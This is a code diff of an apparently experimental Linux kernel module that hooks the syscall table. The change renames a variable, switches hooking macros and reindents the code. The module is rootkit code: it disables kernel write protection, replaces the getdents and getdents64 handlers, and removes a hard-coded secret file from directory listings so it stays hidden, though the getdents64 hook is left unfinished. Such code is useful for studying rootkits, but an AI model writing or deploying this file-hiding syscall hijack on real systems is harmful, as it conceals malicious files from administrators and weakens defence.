@@ -32,7 +32,7 @@ MODULE_LICENSE("GPL");
 # define SECRET_FILE "032416_525.mp4"
 
 
-asmlinkage unsigned long **real_sys_call_table;
+asmlinkage unsigned long **sct;
 
 asmlinkage long
 (*real_getdents)(unsigned int fd,
@@ -45,42 +45,42 @@ fake_getdents(unsigned int fd,
 
 asmlinkage long
 (*real_getdents64)(unsigned int fd,
-                 struct linux_dirent64 __user *dirent,
-                 unsigned int count);
+                   struct linux_dirent64 __user *dirent,
+                   unsigned int count);
 asmlinkage long
 fake_getdents64(unsigned int fd,
-              struct linux_dirent64 __user *dirent,
-              unsigned int count);
+                struct linux_dirent64 __user *dirent,
+                unsigned int count);
 
 
 int
 init_module(void)
 {
-  fm_alert("%s\n", "Greetings the World!");
+    fm_alert("%s\n", "Greetings the World!");
 
-  /* No consideration on failure. */
-  real_sys_call_table = get_sct();
+    /* No consideration on failure. */
+    sct = get_sct();
 
-  disable_wp();
-  HOOK_SYS_CALL_TABLE(getdents);
-  HOOK_SYS_CALL_TABLE(getdents64);
-  enable_wp();
+    disable_wp();
+    HOOK_SCT(sct, getdents);
+    HOOK_SCT(sct, getdents64);
+    enable_wp();
 
-  return 0;
+    return 0;
 }
 
 
 void
 cleanup_module(void)
 {
-  disable_wp();
-  UNHOOK_SYS_CALL_TABLE(getdents);
-  UNHOOK_SYS_CALL_TABLE(getdents64);
-  enable_wp();
+    disable_wp();
+    UNHOOK_SCT(sct, getdents);
+    UNHOOK_SCT(sct, getdents64);
+    enable_wp();
 
-  fm_alert("%s\n", "Farewell the World!");
+    fm_alert("%s\n", "Farewell the World!");
 
-  return;
+    return;
 }
 
 
@@ -89,31 +89,31 @@ fake_getdents(unsigned int fd,
               struct linux_dirent __user *dirent,
               unsigned int count)
 {
-  long ret;
+    long ret;
 
-  ret = real_getdents(fd, dirent, count);
+    ret = real_getdents(fd, dirent, count);
 
-  print_dirent(dirent, ret);
-  ret = remove_dirent_entry(SECRET_FILE, dirent, ret);
-  print_dirent(dirent, ret);
+    print_dirent(dirent, ret);
+    ret = remove_dirent_entry(SECRET_FILE, dirent, ret);
+    print_dirent(dirent, ret);
 
-  return ret;
+    return ret;
 }
 
 
 // TODO: Find triggering cases. This was not called in my test.
 asmlinkage long
 fake_getdents64(unsigned int fd,
-              struct linux_dirent64 __user *dirent,
-              unsigned int count)
+                struct linux_dirent64 __user *dirent,
+                unsigned int count)
 {
-  long ret;
+    long ret;
 
-  fm_alert("==> %s\n", __func__);
+    fm_alert("==> %s\n", __func__);
 
-  ret = real_getdents64(fd, dirent, count);
+    ret = real_getdents64(fd, dirent, count);
 
-  // TODO: Add hooking logic.
+    // TODO: Add hooking logic.
 
-  return ret;
+    return ret;
 }
